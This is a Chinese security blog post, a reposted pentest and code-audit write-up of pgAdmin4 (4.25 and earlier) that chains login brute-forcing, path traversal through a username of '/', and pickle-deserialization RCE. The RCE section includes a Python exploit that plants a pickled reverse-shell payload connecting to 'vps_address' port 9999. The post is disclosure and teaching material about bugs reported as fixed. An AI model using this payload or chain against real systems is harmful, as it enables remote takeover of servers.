\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/rgbYn1xCAlomzreriwvbjQ)

这是 **酒仙桥六号部队** 的第 **105** 篇文章。

全文共计 3264 个字，预计阅读时长 10 分钟。

**前言**

在渗透的时候扫了扫全端口，偶遇一个系统 pgadmin4，它是一款管理 postgresql 数据库的 web 端程序，docker pull 50M+。由于渗透测试爆破的时候发现一些小细节便开始了这次 python 代码审计，最终发现了 RCE。其中包括多个漏洞利用，目前 pgadmin4.25 及以下都存在这些漏洞，和官方邮件上报漏洞后 4.26 到最新版漏洞已修复。

**渗透入口**

接到一个比较棘手的项目基本资产收集后发现没有软柿子捏，就针对了一些非 CDN ip 做了全端口扫描发现这处 5050 端口的 web 资产为 pgadmin4，不管他是啥系统，没有验证码干就完了。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEt303YfVQg8q04osc9lYEv1iaUaDl1WWq9AtJjpAZjL8mUzUZQfkiciavPw/640?wx_fmt=png)

一波暴力破解后发现大量 302 跳转，在刷新页面时 Cookie 已经可以成功登录系统。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtzeth2cLk7QjiaZVwnCSmPFuQdvBmiaBa4HydicHz77jGgtDwurXiaJGFcQ/640?wx_fmt=png)

经过判断发现是账号为 1 密码为 123456 成功登录系统，但是登录成功后发现用户名是邮箱。这应该是登录验证逻辑方面的缺陷后面代码审计部分再关注，又去下载了官网源码，代码使用框架为 flask，python web 系统后台也比较难直接获取 webshell，索性顺着登录缺陷进行一波代码审计。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEt01VxM9pz7jZVjSv0d48W9Mm4ic6yH0e1tdFrLPTQkwN5JYRib5gpAC0Q/640?wx_fmt=png)

**代码审计**

该项目挂载 postgres 旗下，当时挖掘还是最新版，上报后目前最新版已修复。https://github.com/postgres/pgadmin4/tree/REL-4\_24

### 一）无需得知 email 的暴力破解

先来深入了解登录后的账号验证逻辑为什么会产生使用 1/2/3 这样的序号 id 作为用户名的情况。

Flask 项目，在登录代码函数路由处下断点。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtVVg6c2d414kEgNkadTxBSRWibibSaeloJMBXMPbt53ib291Ekia7pbEw6w/640?wx_fmt=png)

通过跟踪上图函数。

web/pgadmin/authenticate/**init**.py:48#auth\_obj.validate() 最终调用了 flask\_security 第三方库的 forms.py 中的 validate()，我们可以发现 self.email.data 就是我们接口中输入 email 的值，继续跟进 get\_user 函数。

get\_user 参数是用来从数据库中获取该 email 的用户对象。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtnCibJBdRz8BLWcnE13flXl3vRDqWBfb9fPM5s3dmKUTKDQmicbdlevicA/640?wx_fmt=png)

我们的标识符”1” 被传入 get\_user 函数，当我们传入的 email 为数字或者 UUID 将直接使用 self.user\_model.query.get(1) 从数据库获取用户对象并直接返回，这就造成无需匹配邮箱直接匹配数据库主建 id 导致无需猜解用户名进行后台暴力破解。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtKk66X0JQnzIrBasyt2QmVayuoMsUB1KdRAtvRIpLU0qficCUtJHWRww/640?wx_fmt=png)

也就是说是 flask\_security 的逻辑缺陷导致无需得知 email 即可爆破，看到 github 也提出了 issues 但是官方未解决该问题，如果只使用官方的库进行身份验证就会存在此问题就很离谱。https://github.com/mattupstate/flask-security/issues/862

### 二） 后台任意文件读取 / 修改

进了后台总要想办法扩大危害，这里发现了一处任意文件读取也比较有意思。

1) 在新建服务器时发现可以导入 SSL 证书存在文件管理器功能，点击刷新是可以列当前资源目录下文件并下载。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtiaulpaQHSAb2T12q3IhGVz4bVcGO60iaaE3246FXbbG3bd08xFdnxktw/640?wx_fmt=png)

此时我们抓取数据包将 path 修改为../../../。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtzwFsle0tJeSXOErmKe1wBIoUyOfKEsRt4M0UdRiczZNlJRjicq2gmjkA/640?wx_fmt=png)

分析列文件接口对应函数 getfolder，程序读取用户资源目录。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtSOHEia6Sfrbgsw34xQibRQ28CCgHhJ3VXZjapDkZCX4SA8TxToCuichsw/640?wx_fmt=png)

程序会将用户目录和前端发送的 path 参数目录传入安全检查函数 Filemanager.check\_access\_permission：

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtUC8eqhicuzvyv9apVbzzRicQnVoxEJqzaHU0B0OftllxpwG2ibccLZpmg/640?wx_fmt=png)

check\_access\_permission 校验函数的内部会将 path 参数的值和资源目录组合并使用 os.path.abspath 函数获取真实路径，最终被还原的真实路径必须要包含资源路径，这样无论我们修改任何跨目录格式最终都不会和原有资源路径匹配造成异常抛出（见变量状态栏中 dir 和 orig\_path 的差别）。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtictibUu0eDAicnz7JNKzZ84d19ng2iaI21ZG3OatmHmmz2diaFYGfL8A6qQ/640?wx_fmt=png)

2)  上一条直接跨目录的思路断了，只能找找其他突破口，这时发现文件上传的暴露的路径中带有用户名，也就是说存储目录为【系统用户目录 + 当前创建的用户名】的组合。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtcOVFf9whkjgGcH9DxibhbO4ia7onDlDUVfdoqqa8xBgoz9NLjT4icOklg/640?wx_fmt=png)

既然用户名可控，秉着任何参数都存在风险，查看下读取资源目录的函数代码。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtV6zp4NWFAk2LeS5etmTHYjeloSh78cykWHKH4oVNmldbxdgrZZj5vA/640?wx_fmt=png)

程序使用 os.path.json 方法将源存储目录和 username 组合形成新的存储目录，看到这个函数基本就稳了。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtbrDhdM3jxkn655vBicQV2ew2ITya46ClgcHicnA78shgaGFUadlgGSSw/640?wx_fmt=png)

这里介绍下 os.path.json 函数存在的问题。os.path.json 函数执行逻辑：

1) 只要最后一个参数为”/” 开头就会忽略之前所有参数然后返回路径，见下图。

这样我们构造漏洞的思路就来了创建一个新用户（需要管理员权限也就是 id=1）username 改为”/”，既可以遍历到根目录又可以通过 check\_access\_permission 函数的路径比对校验。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtsQxTqQKz28ksFSv0icLzjgxTA3hS2zwftu1tHDZREEV4zZlXBwEXLcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEt7dykzCNKeMBshVR8pyGTic2xGozYJI47JuMbcbgibM3zTCtESSj5czTg/640?wx_fmt=png)

3） 又遇到情况了，默认情况下 username 在添加时并无法修改，尝试绕过限制修改 username。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtDX77z7gx2Fmme8mJWMFiaVRibLYbWuCYBGXmuE2qMMfL3IbriaHmhlMicg/640?wx_fmt=png)

查看 web/pgadmin/tools/user\_management/**init**.py:346#update 函数发现后端是通过传递表单对象的方式接收参数，后端其实会接收到我们 POST 发送的 username 参数然后提交数据库。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtxJ1Y8n2dMkaicwvemr8GDzVZlkNEMlasduC9mPEqxYRbziaibewBrBcgA/640?wx_fmt=png)

前台 PUT 修改数据包新增 username 字段即可强制修改用户名。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtYLfYhZbD5Yphhk5XJBmmx6dDpvaRsoWlYZ2VLdziakp0pJXiawkbMmcQ/640?wx_fmt=png)

4） 这下都齐全了，登录创建的账号访问文件管理器接口。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtubCcmiaGMXN8ZZvQYhcwOdh04FMSOfyrnvNYJB59v3ZvoCf4A6Haq3w/640?wx_fmt=png)

舒服了，访问文件管理接口成功列出根目录。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtia4JUlWa3n68ibQIa4YdIWv9OrdftrmQxlnzmLw7ImyEjP5LicHuUqJiaQ/640?wx_fmt=png)

访问后发现只能遍历无法下载？不存在的一切只是前端校验罢了： 从后端找到遍历文件模式选择接口，只需要将 dialog\_type 的类型修改为 storage\_dialog 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtzs7SU4HPEZEI2E8OicO1tCPsRzdBB4icKFoIcUSNTEcTZKLcPpH9gxug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtziaFs6HicYcAguoyP61ZTOrO77PtTmbNYABR4cHZjhuF0pt8HJ8Jic71Q/640?wx_fmt=png)

找到下载文件接口读取成功。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtj9l0F3vywdBxYo01YkL51XY0B9FbULrWC2sjFzreaL9m4sYticAaicIQ/640?wx_fmt=png)

### 三） 替换数据库文件反序列化 RCE

寻找 RCE 的点，这里只是发现了这个方法，应该有更加便捷的点： 思路是找到代码中存在从数据库中取值进行反序列化的操作，此处反序列化原本参数格式要求严格，但是由于 pgadmin4 默认使用 sqlite3，可以直接利用文件管理器下载数据库，修改后再上传达到不损坏原始数据，这样触发该接口即可造成反序列化命令执行。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtAelVBplALPfkgdIQfa1qxuInibHrkEmckGMnspQDUaZZUWFlibSpZh3Q/640?wx_fmt=png)

1）docker 下默认数据库为 / var/lib/pgadmin/pgadmin4.db，下载 sqlite 数据库后进行修改然后再上传覆盖源数据库文件。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtsRnd3d9GoiazAquupruFP16mRsJiccaynPAJCvK302sO7Rs7ialIQr5AA/640?wx_fmt=png)

插入一段反弹 shell 的 python 语句，并修改 sqlite3 数据库。

```
import os
import pickle
import socket
import pty


class exp(object):
def \_\_reduce\_\_(self):
a = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((\\\\"vps\_address\\\\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\[\\\\"/bin/sh\\\\",\\\\"-i\\\\"\]);"'
return (os.system,(a,))


e = exp()
s = pickle.dumps(e)

import sqlite3

# OK, now for the DB part: we make it...:
db = sqlite3.connect('pgadmin4.db')
db.execute('UPDATE process set desc = (?) where pid="123"', (s,))
db.commit()
db.close()
```

将序列化内容插入 desc 字段，然后通过上传接口替换数据库文件。  

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtiaGMVExibzMQWJKQIjL2bLpiafY5Ypms4UCVdkwBpYTicXknskEbI8icnuQ/640?wx_fmt=png)

再通过 GET 请求 / misc/bgprocess / 触发反序列化操作, 程序会读取 process.desc 字段的内容导致触发命令执行。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s557gGEv1KJY3ZqwSKp8UgEtdo3FmUGcGibHqtib6c6WnD8RlnwK3lkcKY92m2XjaOfkH3EzFah8eHOg/640?wx_fmt=png)

**总结**

1.  Flask\_security 原生验证身份函数缺陷。
    
2.  os.path.join 拼接存在特性，编程容易犯错。
    
3.  python 由于自身语言灵活性，常常会出现前后端校验不一致问题。因为后端喜欢使用 setattr 直接将表单数据赋值到某个对象插入数据库。
    

渗透中的黑盒测试往往更容易发现能白盒审计的功能点，白盒审计下留意系统函数，第三方框架的特性多深入调试下源码。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s564Abiad4b2nUggeFBz8QyCib3tHSia4iaVNVeRfP12IWicjQwfVekvflKEC9XqUJGK8r6TMhcYd3GFw0g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s564Abiad4b2nUggeFBz8QyCibiaRBNn0A5YI88OyFjU8fn2Isf9bat4vQn18NwG6cXxVOSuKiapNm2nibQ/640?wx_fmt=png)